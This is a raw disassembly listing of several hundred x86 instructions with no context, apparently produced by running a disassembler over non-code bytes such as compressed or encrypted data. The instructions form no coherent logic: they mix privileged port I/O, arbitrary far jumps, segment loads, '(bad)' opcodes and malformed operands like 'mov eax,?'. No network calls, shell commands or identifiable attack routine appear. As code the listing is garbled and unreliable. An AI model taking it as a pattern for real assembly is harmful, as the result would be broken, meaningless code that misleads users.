  421da2:	and    BYTE PTR es:[di],0xfe
  421da7:	not    dl
  421da9:	scas   al,BYTE PTR es:[edi]
  421daa:	adc    al,0xf5
  421dac:	shr    al,0xa6
  421daf:	mov    BYTE PTR [edx],bl
  421db1:	mov    eax,0x38f25c4
  421db6:	inc    edx
  421db7:	shl    BYTE PTR [ebx],0x50
  421dba:	cmp    dh,BYTE PTR [ebp-0xda69638]
  421dc0:	xor    eax,0x931979c6
  421dc5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421dc6:	xchg   esi,eax
  421dc7:	or     DWORD PTR [edi],esi
  421dc9:	push   cs
  421dca:	mov    cl,0xac
  421dcc:	lods   al,BYTE PTR ds:[esi]
  421dcd:	sbb    BYTE PTR [esi],dl
  421dcf:	addr16 jae 0x421d76
  421dd2:	dec    eax
  421dd3:	mov    ds:0x240fb352,eax
  421dd8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421dd9:	mov    eax,0x298fe572
  421dde:	inc    edi
  421ddf:	mov    DWORD PTR [ebx],ebx
  421de1:	stos   DWORD PTR es:[edi],eax
  421de2:	out    dx,eax
  421de3:	outs   dx,BYTE PTR ds:[esi]
  421de4:	jo     0x421e28
  421de6:	mov    ebx,0xe28f2b84
  421deb:	jns    0x421db9
  421ded:	and    al,0xc6
  421def:	jg     0x421d7e
  421df1:	fcmovnu st,st(2)
  421df3:	and    dl,BYTE PTR [eax-0x1e73fbae]
  421df9:	adc    edx,ebp
  421dfb:	stos   DWORD PTR es:[edi],eax
  421dfc:	shr    DWORD PTR [edi-0x6d],1
  421dff:	push   0xfffffff0
  421e01:	xlat   BYTE PTR ds:[ebx]
  421e02:	in     al,dx
  421e03:	or     DWORD PTR [edx+0x77],eax
  421e06:	xor    bh,BYTE PTR [esi+0x3802d8e8]
  421e0c:	add    al,0x62
  421e0e:	mov    ebp,0xd71d0199
  421e13:	and    BYTE PTR [esi+0x4c],ch
  421e16:	je     0x421df1
  421e18:	cwde   
  421e19:	aam    0x11
  421e1b:	mov    ebp,0x96e8c50f
  421e20:	pop    esi
  421e21:	dec    edi
  421e22:	or     ah,BYTE PTR [esi]
  421e24:	or     BYTE PTR [esi],dl
  421e26:	and    BYTE PTR [ebp+0x48b3f537],ch
  421e2c:	fbld   TBYTE PTR [ebx+0x152b8e1e]
  421e32:	mov    ss,WORD PTR ds:0xea434f96
  421e38:	mov    es,WORD PTR [edi-0x1a16cb6b]
  421e3e:	jmp    0x421e20
  421e40:	fidiv  WORD PTR [edx-0x7344d411]
  421e46:	or     al,0x70
  421e48:	out    0xa4,al
  421e4a:	dec    ebx
  421e4b:	call   0xe973773
  421e50:	mov    WORD PTR [edx],gs
  421e52:	or     al,0xb7
  421e54:	pop    es
  421e55:	imul   ebp,DWORD PTR [esi-0x39],0x5e5ee15a
  421e5c:	ret    0x9256
  421e5f:	test   eax,eax
  421e61:	fld    QWORD PTR [esi+esi*4+0x2a]
  421e65:	cli    
  421e66:	rcr    BYTE PTR [ecx],0x76
  421e69:	test   al,0xad
  421e6b:	cmp    ch,BYTE PTR [eax]
  421e6d:	pusha  
  421e6e:	xor    al,0x1a
  421e70:	jnp    0x421e17
  421e72:	bound  eax,QWORD PTR [ebx-0x49]
  421e75:	pop    edi
  421e76:	xor    al,0x80
  421e78:	and    eax,0xe99f4368
  421e7d:	cmp    bl,ch
  421e7f:	and    edi,esi
  421e81:	sar    BYTE PTR [ecx+0x28],0x30
  421e85:	adc    ah,BYTE PTR [esi]
  421e87:	mov    dh,cl
  421e89:	pop    edi
  421e8a:	in     al,0x24
  421e8c:	xchg   ecx,eax
  421e8d:	repnz loopne 0x421eb6
  421e90:	aad    0x63
  421e92:	push   esp
  421e93:	mov    cl,0xd
  421e95:	pop    ebp
  421e96:	dec    ebx
  421e97:	clc    
  421e98:	mov    ds:0x4723079d,al
  421e9d:	add    eax,0x835b84e7
  421ea2:	cmp    al,0x2
  421ea4:	mov    cs,WORD PTR [ecx]
  421ea6:	jnp    0x421f27
  421ea8:	clc    
  421ea9:	cmc    
  421eaa:	push   edx
  421eab:	push   ds
  421eac:	out    dx,eax
  421ead:	into   
  421eae:	jge    0x421f15
  421eb0:	ins    DWORD PTR es:[edi],dx
  421eb1:	pop    ecx
  421eb2:	adc    DWORD PTR [eax],edx
  421eb4:	in     eax,0x96
  421eb6:	inc    esi
  421eb7:	ja     0x421ec7
  421eb9:	js     0x421eec
  421ebb:	inc    ebp
  421ebc:	sbb    ah,dl
  421ebe:	data16 fdivr st,st(7)
  421ec1:	shl    bh,cl
  421ec3:	lods   al,BYTE PTR ds:[esi]
  421ec4:	xlat   BYTE PTR ds:[ebx]
  421ec5:	mov    cl,0x80
  421ec7:	and    eax,0x77d34956
  421ecc:	addr16 mov esp,0xdaaf228f
  421ed2:	mov    esp,0xbc969548
  421ed7:	pushf  
  421ed8:	jno    0x421f23
  421eda:	sbb    eax,0x7579a668
  421edf:	int3   
  421ee0:	mov    bl,0x48
  421ee2:	in     al,dx
  421ee3:	imul   edx,DWORD PTR [ebx+edx*1-0x15],0x64
  421ee8:	pop    esi
  421ee9:	push   cs
  421eea:	inc    edi
  421eeb:	cs loop 0x421ea5
  421eee:	pop    edx
  421eef:	cmp    eax,0xa6588f8a
  421ef4:	inc    ebp
  421ef5:	stos   BYTE PTR es:[edi],al
  421ef6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421ef7:	mov    eax,?
  421ef9:	fsub   DWORD PTR [ebx]
  421efb:	imul   BYTE PTR [esi-0x4b137fde]
  421f01:	outs   dx,BYTE PTR ds:[esi]
  421f02:	dec    edx
  421f03:	test   eax,0x7bb3ffd8
  421f08:	add    al,0x8b
  421f0a:	cdq    
  421f0b:	scas   al,BYTE PTR es:[edi]
  421f0c:	dec    edi
  421f0d:	in     eax,0x14
  421f0f:	and    cl,ah
  421f11:	test   al,0xfa
  421f13:	cmp    al,0x53
  421f15:	mov    bh,BYTE PTR [esi+eax*2]
  421f18:	push   ds
  421f19:	pop    ss
  421f1a:	sub    DWORD PTR [ecx+0x37d72305],ebx
  421f20:	jo     0x421ed8
  421f22:	xchg   ecx,eax
  421f23:	adc    eax,0x8ff07b06
  421f28:	shr    BYTE PTR [esi+0x52802b95],cl
  421f2e:	jg     0x421f18
  421f30:	mov    ecx,0xdfa65aed
  421f35:	cdq    
  421f36:	bound  esi,QWORD PTR [eax+eax*1]
  421f39:	sbb    cl,dh
  421f3b:	sub    BYTE PTR [ebp-0x23],bh
  421f3e:	daa    
  421f3f:	cli    
  421f40:	jg     0x421f1e
  421f42:	mov    cl,0x34
  421f44:	inc    ebp
  421f45:	arpl   WORD PTR ds:0x1dacd358,sp
  421f4b:	and    eax,0xe188c407
  421f50:	sub    ch,BYTE PTR [ebp-0x1]
  421f53:	enter  0x15fe,0x66
  421f57:	call   0x5bd2:0xcc304cbd
  421f5e:	sbb    BYTE PTR [ecx-0x2703ebfd],bl
  421f64:	mov    cl,0xf4
  421f66:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  421f68:	sbb    dh,BYTE PTR [ecx+0x587fc9a5]
  421f6e:	stos   BYTE PTR es:[edi],al
  421f6f:	xlat   BYTE PTR ds:[ebx]
  421f70:	mov    ecx,0xb53973b5
  421f75:	mov    dl,BYTE PTR [eax+0x6]
  421f78:	pop    ecx
  421f79:	les    esi,FWORD PTR [edi-0x50]
  421f7c:	mov    ecx,0xe73cc617
  421f81:	ja     0x421f5e
  421f83:	rcr    dl,0x98
  421f86:	imul   ebp,DWORD PTR [eax],0xffffffc3
  421f89:	test   BYTE PTR [ebx+0xb8c72d0],ch
  421f8f:	pop    edi
  421f90:	dec    ebx
  421f91:	pushf  
  421f92:	jp     0x421f1a
  421f94:	aas    
  421f95:	and    esi,DWORD PTR [ebp-0x279f11fa]
  421f9b:	xor    eax,0x333bba47
  421fa0:	mov    eax,0xdc8c4cba
  421fa5:	test   al,0x27
  421fa7:	xchg   ebp,eax
  421fa8:	das    
  421fa9:	push   edi
  421faa:	and    BYTE PTR [eax-0x61],dh
  421fad:	mov    esi,0xfa71c339
  421fb2:	xor    eax,0xdc887544
  421fb7:	add    BYTE PTR [edx-0x5f],cl
  421fba:	das    
  421fbb:	dec    edx
  421fbc:	mov    edi,0xcb47aca3
  421fc1:	cmp    DWORD PTR [edx-0x6935b440],edx
  421fc7:	inc    edi
  421fc8:	cdq    
  421fc9:	out    dx,al
  421fca:	xchg   esi,eax
  421fcb:	mov    al,ds:0xe0418041
  421fd0:	pop    ds
  421fd1:	div    BYTE PTR [esi+0x45ce7658]
  421fd7:	fnstcw WORD PTR [ebp-0x4240e86b]
  421fdd:	add    al,0xb4
  421fdf:	jnp    0x421fdb
  421fe1:	arpl   WORD PTR [ebx+0x35821565],dx
  421fe7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421fe8:	inc    esp
  421fe9:	pop    ebp
  421fea:	dec    esi
  421feb:	jmp    0x8c36007d
  421ff0:	push   edi
  421ff1:	ficomp WORD PTR ds:0xa3470bad
  421ff7:	into   
  421ff8:	ja     0x422072
  421ffa:	scas   al,BYTE PTR es:[edi]
  421ffb:	dec    ecx
  421ffc:	or     DWORD PTR [eax+0x31],esi
  421fff:	and    esp,esp
  422001:	std    
  422002:	mov    ds:0xc3da740d,al
  422007:	push   esp
  422008:	fdivr  st(0),st
  42200a:	and    bl,BYTE PTR [ebx-0x5b5483e2]
  422010:	xchg   ecx,eax
  422011:	cmp    cl,BYTE PTR [eax]
  422013:	mov    al,ds:0xf205fc52
  422018:	lds    eax,FWORD PTR [ecx]
  42201a:	loopne 0x421fe9
  42201c:	xchg   edx,eax
  42201d:	lods   al,BYTE PTR ds:[esi]
  42201e:	into   
  42201f:	add    DWORD PTR [edi],esi
  422021:	outs   dx,DWORD PTR ds:[esi]
  422022:	fimul  WORD PTR [esi]
  422024:	push   ss
  422025:	and    al,0x15
  422027:	dec    esp
  422028:	add    eax,0x994f6efc
  42202d:	xchg   esi,eax
  42202e:	dec    esi
  42202f:	addr16 or eax,0xe35071f9
  422035:	push   ecx
  422036:	rcr    DWORD PTR [esi],0x13
  422039:	test   eax,0xd03c9096
  42203e:	adc    BYTE PTR [eax-0x36cc4c31],dh
  422044:	pushf  
  422045:	bnd jmp 0x579c853c
  42204b:	and    eax,0x96cbc1fa
  422050:	fmulp  st(2),st
  422052:	mov    bh,0x7
  422054:	cmp    BYTE PTR [esp+eax*4-0x48],ah
  422058:	cmp    BYTE PTR [eax],dh
  42205a:	fcomip st,st(2)
  42205c:	ficomp WORD PTR [eax+0x33]
  42205f:	add    esi,DWORD PTR [eax+0x5c]
  422062:	addr16 mov dl,0xcc
  422065:	dec    eax
  422066:	push   eax
  422067:	(bad)  
  422069:	fs popf 
  42206b:	fcmovnbe st,st(4)
  42206d:	inc    ebx
  42206e:	rol    ecx,0xf3
  422071:	xchg   edx,eax
  422072:	sub    al,0x74
  422074:	pop    edx
  422075:	sbb    eax,0x57563e0c
  42207a:	cmc    
  42207b:	imul   esi,DWORD PTR [edi],0x238a30d6
  422081:	mov    WORD PTR [edi],ds
  422083:	inc    eax
  422084:	sub    DWORD PTR ds:0x3d8f1aaa,ecx
  42208a:	lahf   
  42208b:	dec    esp
  42208c:	pop    ds
  42208d:	nop
  42208e:	jno    0x422103
  422090:	mov    WORD PTR [ecx-0x67],ss
  422093:	jb     0x422022
  422095:	push   edx
  422096:	jb     0x42201d
  422098:	cmp    al,0xef
  42209a:	push   ebx
  42209b:	mov    esi,0xb4876201
  4220a0:	xor    al,BYTE PTR [edi-0x1a]
  4220a3:	cmp    eax,0x61d985b6
  4220a8:	in     al,0xdc
  4220aa:	ficomp DWORD PTR [esi]
  4220ac:	lea    ebx,[ecx+0x35f37b63]
  4220b2:	cmp    eax,0x1246ee3c
  4220b7:	stos   BYTE PTR es:[edi],al
  4220b8:	enter  0x8e82,0xac
  4220bc:	dec    edi
  4220bd:	outs   dx,BYTE PTR ds:[esi]
  4220be:	call   0xbe106b0e
  4220c3:	mov    dl,0x96
  4220c5:	sar    dl,1
  4220c7:	cmp    eax,0xf27a188f
  4220cc:	sbb    ah,BYTE PTR [ebx-0x3480c1c]
  4220d2:	fcmove st,st(3)
  4220d4:	out    dx,al
  4220d5:	iret   
  4220d6:	cs ret 0xe5bb
  4220da:	(bad)  
  4220db:	loopne 0x422122
  4220dd:	jg     0x422142
  4220df:	popf   
  4220e0:	inc    ebp
  4220e1:	adc    eax,0x1bfa7c6f
  4220e6:	cmc    
  4220e7:	and    BYTE PTR [ebp+0x15],ch
  4220ea:	dec    ecx
  4220eb:	dec    edi
  4220ec:	pop    eax
  4220ed:	xchg   ebp,eax
  4220ee:	cmc    
  4220ef:	inc    esi
  4220f0:	jnp    0x42214f
  4220f2:	sar    DWORD PTR [ebx-0x186befbd],cl
  4220f8:	outs   dx,BYTE PTR ds:[esi]
  4220f9:	outs   dx,DWORD PTR ds:[esi]
  4220fa:	mov    esp,cs
  4220fc:	popa   
  4220fd:	lods   eax,DWORD PTR ds:[esi]
  4220fe:	dec    ecx
  4220ff:	jp     0x422139
  422101:	pop    esp
  422102:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422103:	cmp    bl,BYTE PTR [edi]
  422105:	jge    0x42215b
  422107:	pusha  
  422108:	aaa    
  422109:	stc    
  42210a:	cmp    al,0x73
  42210c:	lods   eax,DWORD PTR ds:[esi]
  42210d:	cdq    
  42210e:	bound  ebx,QWORD PTR [edi-0x79]
  422111:	adc    ecx,ecx
  422113:	jmp    0x4220f4
  422115:	cmp    edx,DWORD PTR [edi-0x68]
  422118:	ret    
  422119:	mov    ah,0xc7
  42211b:	ja     0x422174
  42211d:	pop    ecx
  42211e:	or     eax,0x1a27e3e6
  422123:	lea    esi,[ebp+0x22e746f6]
  422129:	cmc    
  42212a:	test   eax,0x5ae4007b
  42212f:	test   eax,0xf78f9a21
  422134:	jns    0x42217d
  422136:	adc    DWORD PTR [ebp+0x55],esi
  422139:	popf   
  42213a:	shr    al,1
  42213c:	push   ecx
  42213d:	loopne 0x42218e
  42213f:	pop    ebx
  422140:	pop    edi
  422141:	inc    ebp
  422142:	sub    cl,BYTE PTR [ecx+0xd]
  422145:	pop    ebx
  422146:	stos   BYTE PTR es:[edi],al
  422147:	cmc    
  422148:	xchg   ecx,eax
  422149:	ret    0xf0b8
  42214c:	dec    al
  42214e:	leave  
  42214f:	stc    
  422150:	out    0x32,eax
  422152:	stos   BYTE PTR es:[edi],al
  422153:	inc    DWORD PTR [esi-0x3a8029a7]
  422159:	or     esi,DWORD PTR [edx-0x5556a949]
  42215f:	or     eax,0xe672e5d6
  422164:	scas   al,BYTE PTR es:[edi]
  422165:	sahf   
  422166:	and    al,bh
  422168:	mov    eax,ds:0x7b89402b
  42216d:	mov    eax,0x7088e43
  422172:	push   cs
  422173:	mov    bl,0x42
  422175:	pop    edi
  422176:	adc    al,0xda
  422178:	push   ebp
  422179:	loop   0x422131
  42217b:	push   es
  42217c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42217d:	cli    
  42217e:	mov    ebx,0x2c13d09f
  422183:	jmp    0x149b518e
  422188:	push   ds
  422189:	and    eax,0x212d0b17
  42218e:	and    al,0xcc
  422190:	mov    bl,0xf
  422192:	or     BYTE PTR [ecx],bl
  422194:	sub    ebx,DWORD PTR [ebp+0xe59ec77]
  42219a:	dec    ebx
  42219b:	call   FWORD PTR [esi]
  42219d:	stos   DWORD PTR es:[edi],eax
  42219e:	js     0x4221d6
  4221a0:	cmp    al,BYTE PTR [edx+0x11c81a8e]
  4221a6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4221a7:	jo     0x422189
  4221a9:	sbb    al,0x7c
  4221ab:	sbb    DWORD PTR [ebx-0x74],ebx
  4221ae:	rol    bh,0x4b
  4221b1:	pop    ss
  4221b2:	retf   0xc5be
  4221b5:	xchg   edx,eax
  4221b6:	(bad)  
  4221b8:	outs   dx,DWORD PTR ds:[esi]
  4221b9:	add    eax,0xd1964719
  4221be:	cmp    bh,bl
  4221c0:	adc    BYTE PTR [edx+0x2d],dl
  4221c3:	pushf  
  4221c4:	xlat   BYTE PTR ds:[ebx]
  4221c5:	sar    ebp,1
  4221c7:	add    BYTE PTR [edx-0x48],al
  4221ca:	inc    esi
  4221cb:	retf   0x9198
  4221ce:	cld    
  4221cf:	jge    0x422162
  4221d1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4221d2:	cdq    
  4221d3:	mov    edi,0x86a37ada
  4221d8:	sti    
  4221d9:	or     BYTE PTR ds:0x35a7ed7f,al
  4221df:	mov    dl,0x86
  4221e1:	leave  
  4221e2:	ds (bad) 
  4221e4:	icebp  
  4221e5:	cmc    
  4221e6:	mov    cl,0xfb
  4221e8:	(bad)  
  4221e9:	mov    al,0x69
  4221eb:	inc    edi
  4221ec:	(bad)  
  4221ed:	sbb    BYTE PTR [esi+0x65],bl
  4221f0:	sub    al,0x3d
  4221f2:	hlt    
  4221f3:	jo     0x42221d
  4221f5:	jecxz  0x4221ec
  4221f7:	ins    DWORD PTR es:[edi],dx
  4221f8:	out    0x58,al
  4221fa:	jns    0x4221bb
  4221fc:	pop    es
  4221fd:	add    al,0x6e
  4221ff:	out    0x9e,al
  422201:	dec    esp
  422202:	or     al,0x47
  422204:	sbb    BYTE PTR [edi],0xbf
  422207:	push   ecx
  422208:	cmp    BYTE PTR [ebx-0x6f04f116],0x6e
  42220f:	(bad)  
  422210:	je     0x422267
  422212:	adc    edx,0xafe5874d
  422218:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422219:	xor    BYTE PTR [edx],dl
  42221b:	imul   bl
  42221d:	test   BYTE PTR [esi-0x57],bl
  422220:	jmp    0x56eb4ab7
  422225:	ins    DWORD PTR es:[edi],dx
  422226:	imul   ebp,ecx,0xde70df3d
  42222c:	ret    
  42222d:	sbb    ebp,ebp
  42222f:	pop    eax
  422230:	inc    al
  422232:	cmp    al,0x56
  422234:	mov    ebx,0x6fb8e768
  422239:	fsub   QWORD PTR [ebx+0x4aaba420]
  422240:	in     eax,dx
  422241:	mov    ecx,0xaf0eaba1
  422246:	mov    esi,0xcc98045e
  42224b:	mov    ah,0xb0
  42224d:	loope  0x4222c7
  42224f:	jmp    0x42229a
  422251:	add    BYTE PTR [edx],0xe8
  422254:	cwde   
  422255:	leave  
  422256:	imul   ecx,ebp,0xd7207d35
  42225c:	xchg   edx,eax
  42225d:	(bad)  
  42225e:	xchg   ebx,eax
  42225f:	jno    0x42225d
  422261:	inc    edx
  422262:	outs   dx,DWORD PTR ds:[esi]
  422263:	xchg   ecx,eax
  422264:	or     DWORD PTR [ecx+0x5419b944],esp
  42226a:	push   cs
  42226b:	enter  0x7862,0xa6
  42226f:	sbb    esp,edi
  422271:	in     eax,0x29
  422273:	xor    eax,0xc56f7da8
  422278:	shl    DWORD PTR [ebx-0x6190712d],cl
  42227e:	cmc    
  42227f:	loop   0x422254
  422281:	mov    esi,0xa122d719
  422286:	dec    ebx
  422287:	or     al,0xa7
  422289:	sbb    al,0xf9
  42228b:	(bad)  
  42228c:	loop   0x42225e
  42228e:	xchg   esi,eax
  42228f:	repnz fist WORD PTR [eax+0xa]
  422293:	add    BYTE PTR [esi+edx*4],ch
  422296:	mov    al,ds:0x3c073db2
  42229b:	push   ebx
  42229c:	mov    cl,0x88
  42229e:	jle    0x422273
  4222a0:	je     0x422252
  4222a2:	xlat   BYTE PTR ds:[ebx]
  4222a3:	cmc    
  4222a4:	ja     0x422296
  4222a6:	int    0x70
  4222a8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4222a9:	add    DWORD PTR [esi],esp
  4222ab:	fbld   TBYTE PTR [eax-0x12]
  4222ae:	jg     0x422322
  4222b0:	aad    0x3f
  4222b2:	arpl   sp,sp
  4222b4:	(bad)  ds:0x622a1ee4
  4222bb:	cli    
  4222bc:	add    BYTE PTR ds:0xe2d007da,al
  4222c2:	out    0x1a,al
  4222c4:	mov    ?,ebp
  4222c6:	pop    ebx
  4222c7:	pushf  
  4222c8:	inc    edi
  4222c9:	jns    0x4222a5
  4222cb:	inc    edi
  4222cc:	jno    0x4222a8
  4222ce:	stos   DWORD PTR es:[edi],eax
  4222cf:	jns    0x422319
  4222d1:	pop    ecx
  4222d2:	push   es
  4222d3:	or     BYTE PTR ds:0xff2bf026,bh
  4222d9:	ds adc ebp,0xe7b704a0
  4222e0:	iret   
  4222e1:	mov    bl,BYTE PTR gs:[edx+0x3e]
  4222e5:	pop    esp
  4222e6:	lods   eax,DWORD PTR ds:[esi]
  4222e7:	outs   dx,BYTE PTR ds:[esi]
  4222e8:	sbb    eax,0x3a61d7f
  4222ed:	jle    0x42233a
  4222ef:	clc    
  4222f0:	mov    ds:0x517683d8,al
  4222f5:	js     0x42233d
  4222f7:	xor    edi,ebx
  4222f9:	jo     0x4222ee
  4222fb:	mov    al,ds:0x1479df47
  422300:	sti    
  422301:	pop    ecx
  422302:	mov    cl,0x43
  422304:	fistp  QWORD PTR [edx-0xb]
  422307:	pop    ecx
  422308:	adc    eax,0x5c7a7574
  42230d:	jecxz  0x422373
  42230f:	and    ecx,ebx
  422311:	inc    ecx
  422312:	sbb    DWORD PTR [edi*4-0x2ebaad95],ecx
  422319:	mov    ebx,0xc024eb3b
  42231e:	cmp    DWORD PTR [ecx-0x6f],ebx
  422321:	lds    ebp,FWORD PTR [esi]
  422323:	aad    0x62
  422325:	pop    ds
  422326:	mov    eax,0x53489b9f
  42232b:	mov    ds:0x2dffe0d6,al
  422330:	fcmovne st,st(0)
  422332:	fs cmc 
  422334:	js     0x422356
  422336:	popf   
  422337:	popa   
  422338:	out    0x2,eax
  42233a:	sbb    al,0x32
  42233c:	fisubr WORD PTR [ebx-0x37]
  42233f:	jmp    0x42237c
  422341:	jmp    0xdf7e:0x281a4b3e
  422348:	pop    ss
  422349:	sub    eax,0x12d7df39
  42234e:	jmp    0xeeb:0x4c2d2981
  422355:	fldenv [ebx-0x7ccc48]
  42235b:	push   ecx
  42235c:	retf   
  42235d:	mov    dl,0x82
  42235f:	je     0x42234f
  422361:	mov    DWORD PTR [ebx+0x34],ebx
  422364:	xor    ch,BYTE PTR [ebp+0x6a]
  422367:	cmp    esp,ecx
  422369:	leave  
  42236a:	cwde   
  42236b:	and    eax,0xd48a4050
  422370:	fnsave [eax-0x7a4b9f85]
  422376:	in     al,dx
  422377:	or     BYTE PTR [eax-0x74],dh
  42237a:	lds    esi,FWORD PTR [ebp-0x69]
  42237d:	outs   dx,BYTE PTR ds:[esi]
  42237e:	pop    edi
  42237f:	pop    ecx
  422380:	es adc eax,ecx
  422383:	mov    dh,0xa1
  422385:	rcl    DWORD PTR [esi+0x4e],cl
  422388:	sub    DWORD PTR [ebp+0xe83a68e],edx
  42238e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42238f:	(bad)  
  422390:	loopne 0x42239a
  422392:	mov    bl,0x7f
  422394:	jp     0x422401
  422396:	mov    al,0xca
  422398:	dec    edi
  422399:	add    BYTE PTR ss:[eax],ah
  42239c:	stos   DWORD PTR es:[edi],eax
  42239d:	scas   al,BYTE PTR es:[edi]
  42239e:	ja     0x422377
  4223a0:	dec    ax
  4223a2:	(bad)  
  4223a3:	loopne 0x422376
  4223a5:	ret    
  4223a6:	(bad)  
  4223a7:	and    ebx,DWORD PTR [edx]
  4223a9:	mov    DWORD PTR [ebx-0x70239e32],ecx
  4223af:	stos   BYTE PTR es:[edi],al
  4223b0:	or     eax,DWORD PTR [edi-0x3ca183e9]
  4223b6:	test   eax,0xe52b4c7f
  4223bb:	push   esi
  4223bc:	adc    BYTE PTR [ebx-0x52],cl
  4223bf:	pushf  
  4223c0:	pushf  
  4223c1:	jl     0x422400
  4223c3:	add    cl,bl
  4223c5:	pushf  
  4223c6:	inc    ebx
  4223c7:	ret    0x124e
  4223ca:	aad    0xfa
  4223cc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4223cd:	xchg   ch,dh
  4223cf:	js     0x422425
  4223d1:	push   es
  4223d2:	dec    eax
  4223d3:	jmp    0xdc2b:0xdcfbc6ec
  4223da:	adc    eax,0xc0b2e182
  4223df:	cdq    
  4223e0:	sbb    BYTE PTR [ecx],bh
  4223e2:	adc    cl,BYTE PTR [ebp-0x2a]
  4223e5:	out    dx,eax
  4223e6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4223e7:	scas   eax,DWORD PTR es:[edi]
  4223e8:	popf   
  4223e9:	sar    DWORD PTR [edx+0x4653f894],1
  4223ef:	cmp    DWORD PTR [ebx+0x27],esi
  4223f2:	rcr    DWORD PTR [edx+ebp*8],0x21
  4223f6:	nop
  4223f7:	mov    ds:0x8e49b7fe,eax
  4223fc:	jns    0x422392
  4223fe:	leave  
  4223ff:	sahf   
  422400:	addr16 mov cl,0x90
  422403:	std    
  422404:	bound  ebx,QWORD PTR [ebx-0x7461c730]
  42240a:	jbe    0x4223bb
  42240c:	mov    eax,ds:0x788f8ea2
  422411:	jl     0x422450
  422413:	adc    BYTE PTR [esi+0x7e],0xf7
  422417:	and    BYTE PTR [ecx-0x5d],0x9e
  42241b:	inc    ebx
  42241c:	jnp    0x422496
  42241e:	mov    esp,0xde29a02
  422423:	xlat   BYTE PTR ds:[ebx]
  422424:	loope  0x422415
  422426:	stos   DWORD PTR es:[edi],eax
  422427:	mov    eax,ds:0x519e6390
  42242c:	sbb    ebp,esp
  42242e:	xchg   esp,eax
  42242f:	mov    dh,0x43
  422431:	js     0x422430
  422433:	js     0x4223cf
  422435:	jl     0x422433
  422437:	xchg   edi,eax
  422438:	test   BYTE PTR [edi-0x67],ah
  42243b:	add    dl,BYTE PTR [esi+0x180704e9]
  422441:	sub    DWORD PTR [esi],ebp
  422443:	and    BYTE PTR [edi-0x34b4f718],0x9b
  42244a:	xchg   BYTE PTR ds:0xada27753,dl
  422450:	push   DWORD PTR [edi+0x24389eb3]
  422456:	loope  0x4223f6
  422458:	in     al,dx
  422459:	test   eax,0x9e96c3c0
  42245e:	pusha  
  42245f:	retf   
  422460:	hlt    
  422461:	sub    edx,DWORD PTR [eax+0x5c72561e]
  422467:	mov    WORD PTR [edx-0x1c],cs
  42246a:	arpl   WORD PTR [edx-0x5e],dx
  42246d:	xchg   edi,eax
  42246e:	sbb    ebx,ebx
  422470:	shl    ebp,cl
  422472:	lods   eax,DWORD PTR ds:[esi]
  422473:	xchg   esp,eax
  422474:	push   ds
  422475:	daa    
  422476:	push   cs
  422477:	fsub   DWORD PTR ds:[ecx+0x4a]
  42247b:	dec    edx
  42247c:	mov    ebx,DWORD PTR [ebp-0x23]
  42247f:	xor    al,0x4c
  422481:	jl     0x4224bf
  422483:	addr16 in eax,dx
  422485:	xchg   ebp,eax
  422486:	and    DWORD PTR [eax],edi
  422488:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422489:	or     DWORD PTR ds:[eax-0x66debbdb],0x29
  422491:	jno    0x42245d
  422493:	add    BYTE PTR [esp+ebx*8+0x53d998c6],dl
  42249a:	sub    BYTE PTR [ecx],al
  42249c:	mov    gs,WORD PTR [eax+0x6f0b250e]
  4224a2:	mov    edi,0xc949c5c1
  4224a7:	cdq    
  4224a8:	aas    
  4224a9:	or     bh,BYTE PTR [esi+0x6376c3cb]
  4224af:	and    al,BYTE PTR [ebx*1-0x2b52cabf]
  4224b6:	sbb    esp,eax
  4224b8:	mov    dh,0xdd
  4224ba:	mov    edx,0x72347e71
  4224bf:	jge    0x4224b9
  4224c1:	cmc    
  4224c2:	cs xor al,0xc3
  4224c5:	mov    ecx,0xce3df167
  4224ca:	or     esi,ecx
  4224cc:	sub    ch,BYTE PTR [esi-0x2a]
  4224cf:	imul   ebx,esi,0xffffffd5
  4224d2:	aas    
  4224d3:	dec    edi
  4224d4:	in     al,dx
  4224d5:	or     al,bl
  4224d7:	mov    ch,0x72
  4224d9:	xchg   ebx,eax
  4224da:	out    0xe5,al
  4224dc:	adc    eax,0x6be2cf06
  4224e1:	push   ss
  4224e2:	or     DWORD PTR [eax],edi
  4224e4:	sbb    al,0xb3
  4224e6:	pop    ds
  4224e7:	mov    DWORD PTR [ebx-0x30ed5670],esi
  4224ed:	pop    esi
  4224ee:	(bad)  
  4224ef:	fcom   st(2)
  4224f1:	enter  0xe2af,0x7a
  4224f5:	mov    ds:0x164af558,eax
  4224fa:	sti    
  4224fb:	add    al,BYTE PTR [eax-0x3729c0ca]
  422501:	mov    esi,ecx
  422503:	pop    esi
  422504:	in     eax,dx
  422505:	adc    al,0x5
  422507:	jae    0x422572
  422509:	test   ebx,ecx
  42250b:	js     0x422526
  42250d:	sub    al,0xf6
  42250f:	cdq    
  422510:	call   0xd8ed2e43
  422515:	pop    esp
  422516:	sbb    ah,BYTE PTR [esi+eiz*4+0x4c]
  42251a:	arpl   WORD PTR [ecx],dx
  42251c:	int    0xbd
  42251e:	dec    ebp
  42251f:	cwde   
  422520:	mov    ecx,0x4f769231
  422525:	xor    edx,ebp
  422527:	mov    dh,0x1a
  422529:	(bad)  
  42252a:	in     al,0xf1
  42252c:	inc    eax
  42252d:	loopne 0x4224b0
  42252f:	cmc    
  422530:	lods   eax,DWORD PTR ds:[esi]
  422531:	mov    ds:0x19b300b4,eax
  422536:	jo     0x4224de
  422538:	push   ebp
  422539:	push   ebp
  42253a:	fstp   QWORD PTR [ebx+0x32]
  42253d:	fsub   QWORD PTR [ebp+0x77]
  422540:	dec    esp
  422541:	retf   0x3cbd
  422544:	(bad)  
  422545:	xor    edi,DWORD PTR [ebx]
  422547:	and    DWORD PTR [ebx+ecx*4+0x7e223147],ebx
